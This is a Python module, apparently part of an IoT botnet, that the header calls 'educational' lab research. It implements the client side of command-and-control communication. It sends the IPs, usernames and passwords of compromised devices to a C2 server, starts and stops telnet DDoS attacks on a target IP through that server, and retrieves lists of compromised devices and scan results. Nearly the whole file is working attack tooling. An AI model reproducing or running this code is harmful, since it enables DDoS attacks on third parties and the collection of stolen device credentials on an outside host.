#!/usr/bin/env python3
"""
IoT Security Research - C2 Communication Module
Educational Purpose Only - For Controlled Lab Environment
"""

import requests
import json
import logging
import re
from datetime import datetime


class C2Communicator:
    """Handles communication with C2 server"""
    
    def __init__(self, cnc_server_ip, logger=None):
        self.cnc_server_ip = cnc_server_ip
        self.cnc_url = f"http://{cnc_server_ip}:5000"
        self.logger = logger or logging.getLogger(__name__)
    
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.logger.info(f"[C2Comm] {message}")
        print(f"[{timestamp}] {message}")
    
    def register_compromised_device(self, ip, username, password):
        """Register compromised device with C&C server with enhanced retry logic and error handling"""
        try:
            # Validate inputs
            if not ip or not isinstance(ip, str):
                self.log(f"[FAIL] Invalid IP address: {ip}")
                return False
                
            # Enhanced IP format validation
            if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
                self.log(f"[FAIL] Invalid IP format: {ip}")
                return False
            
            payload = {
                'ip': ip,
                'username': username or "",
                'password': password or "",
                'status': 'online',
                'device_type': self._detect_device_type(ip),
                'timestamp': datetime.now().isoformat()
            }
            
            self.log(f"Sending registration request for {ip} with '{username}':'{password}' to C&C server")
            
            # Retry logic with escalating timeouts
            max_retries = 3
            timeouts = [20, 45, 60]  # Progressive timeout increase
            last_error = None
            
            for attempt in range(max_retries):
                try:
                    self.log(f"Registration attempt {attempt + 1}/{max_retries} for {ip} (timeout: {timeouts[attempt]}s)")
                    
                    response = requests.post(
                        f"{self.cnc_url}/register-device",
                        json=payload,
                        headers={'Content-Type': 'application/json'},
                        timeout=timeouts[attempt]
                    )
                    
                    if response.status_code == 200:
                        self.log(f"[SUCCESS] Device {ip} successfully registered with C&C server")
                        return True
                    elif response.status_code == 409:
                        self.log(f"[INFO] Device {ip} already registered with C&C server")
                        return True
                    else:
                        last_error = f"HTTP {response.status_code}: {response.text}"
                        self.log(f"[FAIL] Registration attempt {attempt + 1} failed: {last_error}")
                        
                except requests.exceptions.Timeout:
                    last_error = f"Timeout after {timeouts[attempt]} seconds"
                    self.log(f"[FAIL] Registration attempt {attempt + 1} timed out after {timeouts[attempt]}s")
                    
                except requests.exceptions.ConnectionError as e:
                    last_error = f"Connection error: {str(e)}"
                    self.log(f"[FAIL] Registration attempt {attempt + 1} - Connection error: {e}")
                    
                except requests.exceptions.RequestException as e:
                    last_error = f"Request error: {str(e)}"
                    self.log(f"[FAIL] Registration attempt {attempt + 1} - Request error: {e}")
                    
                except Exception as e:
                    last_error = f"Unexpected error: {str(e)}"
                    self.log(f"[FAIL] Registration attempt {attempt + 1} - Unexpected error: {e}")
            
            # All retry attempts failed
            self.log(f"[FAIL] All {max_retries} registration attempts failed for {ip}. Last error: {last_error}")
            return False

        except Exception as e:
            error_msg = f"Critical error in registration process: {str(e)}"
            self.log(f"[FAIL] {error_msg}")
            return False
    
    def _detect_device_type(self, ip):
        """Try to detect device type based on basic characteristics"""
        # This is a simplified version - full implementation would use port scanning
        return 'unknown'
    
    def start_ddos_via_c2(self, target_ip, attack_type):
        """Initiate DDoS attack via C2 server"""
        try:
            self.log(f"Initiating {attack_type} DDoS attack on {target_ip} via C2 server...")
            
            response = requests.post(
                f"{self.cnc_url}/start-telnet-ddos",
                json={
                    "target": target_ip,
                    "attack_type": attack_type
                },
                timeout=120
            )
            
            if response.status_code == 200:
                response_data = response.json()
                
                if response_data.get('status') == 'success':
                    successful_ips = response_data.get('successful_ips', [])
                    failed_ips = response_data.get('failed_ips', {})
                    total_devices = response_data.get('total_devices', 0)
                    
                    self.log(f"[SUCCESS] DDoS attack initiated successfully")
                    self.log(f"Successful devices: {len(successful_ips)}")
                    self.log(f"Failed devices: {len(failed_ips)}")
                    
                    return True, response_data
                else:
                    error_msg = response_data.get('message', 'Unknown error')
                    self.log(f"[FAIL] DDoS attack failed: {error_msg}")
                    return False, response_data
            else:
                self.log(f"[FAIL] C2 server returned error {response.status_code}")
                return False, None

        except requests.exceptions.Timeout:
            self.log("[FAIL] DDoS request timed out")
            return False, None
        except Exception as e:
            self.log(f"[FAIL] Failed to initiate DDoS via C2: {e}")
            return False, None
    
    def stop_ddos_via_c2(self):
        """Stop DDoS attack via C2 server"""
        try:
            self.log("Stopping DDoS attack via C2 server...")
            
            response = requests.post(
                f"{self.cnc_url}/stop-telnet-ddos",
                timeout=60
            )
            
            if response.status_code == 200:
                response_data = response.json()
                stopped_count = response_data.get('stopped_count', 0)
                self.log(f"[SUCCESS] Successfully stopped DDoS on {stopped_count} devices")
                return True, response_data
            else:
                self.log(f"[FAIL] C2 server returned error {response.status_code}: {response.text}")
                return False, None

        except requests.exceptions.Timeout:
            self.log("[FAIL] Stop DDoS request timed out")
            return False, None
        except Exception as e:
            self.log(f"[FAIL] Failed to stop DDoS via C2: {e}")
            return False, None
    
    def fetch_scan_results_from_c2(self):
        """Fetch scan results from the C2 server"""
        try:
            response = requests.get(f"{self.cnc_url}/get-scan-results", timeout=10)
            if response.status_code == 200:
                scan_results = response.json()
                self.log(f"Loaded {len(scan_results)} scan results from C2 server")
                return scan_results
            else:
                self.log(f"Failed to fetch scan results from C2. Status: {response.status_code}")
                return []
        except requests.exceptions.Timeout:
            self.log("Timeout fetching scan results from C2")
            return []
        except Exception as e:
            self.log(f"Error fetching scan results: {e}")
            return []

    def fetch_compromised_devices_from_c2(self):
        """Fetch compromised devices from the C2 server"""
        try:
            response = requests.get(f"{self.cnc_url}/get-compromised-devices", timeout=10)
            if response.status_code == 200:
                devices = response.json()
                self.log(f"Loaded {len(devices)} compromised devices from C2")
                return devices
            else:
                self.log(f"Failed to fetch compromised devices from C2. Status: {response.status_code}")
                return []
        except requests.exceptions.Timeout:
            self.log("Timeout fetching compromised devices from C2")
            return []
        except Exception as e:
            self.log(f"Error fetching compromised devices: {e}")
            return []
    
    def verify_c2_registration_status(self, devices):
        """Verify registration status of devices with C2 server"""
        try:
            self.log("Verifying C2 registration status...")
            
            if not devices:
                self.log("No devices to verify")
                return []
            
            # Get registered devices from C2
            registered_devices = self.fetch_compromised_devices_from_c2()
            registered_ips = [device['ip'] for device in registered_devices]
            
            unregistered_devices = []
            
            for device in devices:
                if device['ip'] in registered_ips:
                    device['registered_c2'] = True
                    self.log(f"✅ {device['ip']} is registered with C2")
                else:
                    device['registered_c2'] = False
                    unregistered_devices.append(device)
                    self.log(f"❌ {device['ip']} is NOT registered with C2")
            
            if unregistered_devices:
                self.log(f"Found {len(unregistered_devices)} unregistered devices")
                self._analyze_registration_discrepancy(unregistered_devices)
            
            return devices
            
        except Exception as e:
            self.log(f"Error verifying C2 registration status: {e}")
            return devices
    
    def _analyze_registration_discrepancy(self, unregistered_devices):
        """Analyze why devices are not registered with C2"""
        self.log("Analyzing registration discrepancy...")
        
        for device in unregistered_devices:
            ip = device['ip']
            self.log(f"Analyzing {ip}...")
            
            # Try to re-register the device
            success = self.register_compromised_device(
                ip, 
                device['username'], 
                device['password']
            )
            
            if success:
                device['registered_c2'] = True
                self.log(f"✅ Successfully re-registered {ip} with C2")
            else:
                self.log(f"❌ Failed to re-register {ip} with C2")
    
    def test_connection(self):
        """Test connection to C2 server"""
        try:
            response = requests.get(f"{self.cnc_url}/", timeout=5)
            if response.status_code == 200:
                self.log(f"✅ Connected to C2 server at {self.cnc_server_ip}")
                return True
            else:
                self.log(f"⚠️ C2 server at {self.cnc_server_ip} returned status code {response.status_code}")
                return False
        except Exception:
            self.log(f"❌ Cannot connect to C2 server at {self.cnc_server_ip}")
            return False
